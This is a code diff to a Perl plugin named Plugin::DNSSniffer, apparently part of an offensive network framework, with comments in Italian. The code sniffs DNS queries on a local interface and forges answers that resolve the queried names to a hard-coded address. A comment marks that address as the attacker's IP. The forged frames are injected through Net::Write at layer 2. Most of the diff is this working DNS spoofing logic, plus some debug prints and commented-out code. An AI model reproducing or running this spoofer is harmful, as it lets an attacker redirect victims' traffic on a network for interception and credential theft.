@@ -12,9 +12,6 @@ use Net::Frame::Layer::UDP qw(:consts);
 use Net::Frame::Layer::DNS qw(:consts);
 use Data::Dumper;
 
-use NetPacket::UDP;
-use NetPacket::IP;
-
 class Plugin::DNSSniffer {
 
     our $VERSION = '0.1a';
@@ -25,7 +22,7 @@ class Plugin::DNSSniffer {
     our @PUBLIC_FUNCTIONS = qw(start stop);
 
     nemesis_module;
-
+    my $loop = 0; 
     method start() {
 
       if($self->Init->checkroot()){
@@ -43,7 +40,6 @@ class Plugin::DNSSniffer {
         #$self->Sniffer()->destroy() if($self->Sniffer);
     }
 
-
     method event_udp($Packet){
         my $IO = $Init->io;
         #$Init->io->info(__PACKAGE__." Received a UDP package");
@@ -59,6 +55,7 @@ class Plugin::DNSSniffer {
         my $dnsQ;
         my $dnsR_custom;
 
+        
 
         #$self->Init->getIO()->print_info( $Packet );
         #$self->Init->getIO()->print_info( $Packet->firstLayer );
@@ -68,11 +65,20 @@ class Plugin::DNSSniffer {
         $dns = $Packet->ref->{DNS};
         $dnsQ = $Packet->ref->{'DNS::Question'};
 
-        # if($udp->src eq "53"){
-        #     $self->Init->getIO()->print_info("-->PACCHETTO<--\n");
-        #     $self->Init->getIO()->print_info($Packet->print . "\n");
+        ##################################################################
+        #     if($ipv4->dst eq "192.168.1.209"){
+        #     $self->Init->getIO()->print_info("YEEEEESSSSSSSSSSSSSSSSSSSSSS\n");
         # }
 
+        # if( $loop < 2 ) {
+        #     if($udp->dst eq "53" || $udp->src eq "53"){
+        #         $self->Init->getIO()->print_info( $Packet->print );
+        #         $loop = $loop + 1;
+        #     }
+        # }
+
+
+        ##################################################################
 
         
         if($eth->isa("Net::Frame::Layer::ETH")){
@@ -89,7 +95,9 @@ class Plugin::DNSSniffer {
 
             $ipv4_custom = Net::Frame::Layer::IPv4->new(
                 id => $ipv4->id,
+                #src => '192.168.1.4', #debug
                 src => $ipv4->dst,
+                protocol => NF_IPv4_PROTOCOL_UDP,
                 dst => $ipv4->src
                 );
 
@@ -134,9 +142,8 @@ class Plugin::DNSSniffer {
 
                             # indirizzo ip sul quale associare la richiesta  
                             my $rdata = Net::Frame::Layer::DNS::RR::A->new(
-                                                            address => '192.168.1.208',
+                                                            address => '192.168.1.208', # indirizzo ip attacker
                                                         );
-                            $self->Init->getIO()->print_info("-->PASSO 1<--\n");
                             # creazione di un record RR
                             my $dnsR_custom = Net::Frame::Layer::DNS::RR->new(
                                                            name     => $dnsQ->name,
@@ -146,8 +153,6 @@ class Plugin::DNSSniffer {
                                                            rdlength => $rdata->getLength,
                                                            #rdata    => $rdata->pack,
                                                         );
-                            $self->Init->getIO()->print_info("-->PASSO 2<--\n");
-
 
                         
 
@@ -158,25 +163,21 @@ class Plugin::DNSSniffer {
                                                             );
 
 
-                            $self->Init->getIO()->print_info("-->PACCHETTO<--\n");
-                            $self->Init->getIO()->print_info($Packet->print . "\n");
-                            $self->Init->getIO()->print_info("-->PACCHETTO CUSTOMIZZATO<--\n");
-                            $self->Init->getIO()->print_info($packet_custom->print . "\n"); 
+                             $self->Init->getIO()->print_info("-->PACCHETTO DI RICHIESTA<--\n");
+                             $self->Init->getIO()->print_info($Packet->print . "\n");
+                             $self->Init->getIO()->print_info("-->PACCHETTO DI RISPOSTA CUSTOMIZZATO<--\n");
+                             $self->Init->getIO()->print_info($packet_custom->print . "\n"); 
 
-
+                            # configurazione sender
                             use Net::Write::Layer qw(:constants);
-                            use Net::Write::Layer3;
-     
-                            my $oWrite = Net::Write::Layer3->new(
-                                                             dst => $ipv4_custom->dst,
-                                                             dev => 'wlp2s0',
-                                                             protocol => NW_IPPROTO_UDP); # bisogna aggiungerlo nel caso di pacchetti UDP
+                            use Net::Write::Layer2;
+                            my $oWrite = Net::Write::Layer2->new(
+                                                            dev => 'wlp2s0',
+                                                        );
                             $oWrite->open;
-     
+
                             # We send the frame
                             $packet_custom->send($oWrite);
-
-     
                             $oWrite->close;
                         }
                     }
